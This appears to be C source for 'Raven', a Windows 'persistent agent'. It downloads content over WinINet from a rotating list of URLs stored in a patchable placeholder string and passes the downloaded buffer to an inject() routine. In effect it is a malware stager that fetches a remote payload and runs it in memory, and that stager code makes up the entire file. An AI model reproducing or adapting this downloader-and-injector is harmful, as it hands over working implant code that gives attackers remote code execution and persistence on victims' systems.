/*
 * Raven - A persistent agent
 */

#include <wininet.h>
#include <windows.h>
#include "raven.h"

/* downloads the contents of the specified URL, dumps it into the specified buffer, and returns the
   number of bytes read */
int download_url(char * url, void * buffer, int maxlen) {
	DWORD  dwSize;       // size of the data available
	DWORD  dwDownloaded; // size of the downloaded data
	int    read = 0;

	HINTERNET root;
	root = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET resource = InternetOpenUrl(root, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

	if (!resource) {
		return 0;
	}

	/* next... let's check and make sure it's a 200 and not something else */
	int statusCode;
	char responseText[256]; // change to wchar_t for unicode
	DWORD responseTextSize = sizeof(responseText);

	if(!HttpQueryInfo(resource, HTTP_QUERY_STATUS_CODE, &responseText, &responseTextSize, NULL)) {
		return 0;
	}

	statusCode = atoi(responseText);
	if (statusCode != 200) {
		return 0;
	}


	while (TRUE) {
		if (!InternetReadFile(resource, (LPVOID)buffer + read, 4096, &dwDownloaded)) {
			break;
		}

		read += dwDownloaded;

		if (dwDownloaded == 0 || read >= maxlen)
			break;
	}

	InternetCloseHandle(root);
	InternetCloseHandle(resource);
	return read;
}

char * URL_DATA = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

char * next_url() {
	static char * token = NULL;
	char * ptr;
	if (token == NULL) {
		token = (char *)malloc(strlen(URL_DATA) + 1);
		strncpy(token, URL_DATA, strlen(URL_DATA) + 1);
		return strtok(token, ",");
	}
	else {
		ptr = strtok(NULL, ",");
		if (ptr == NULL) {
			free(token);
			token = NULL;
			return next_url();
		}
		else {
			return ptr;
		}
	}
}

void raven_go() {
	void * buffer;
	int size;

	buffer = (void *)malloc(MAX_PAYLOAD_SIZE);
	size = download_url(next_url(), buffer, MAX_PAYLOAD_SIZE);
	if (size > 0) {
		inject(buffer, size);
	}
	free(buffer);
}
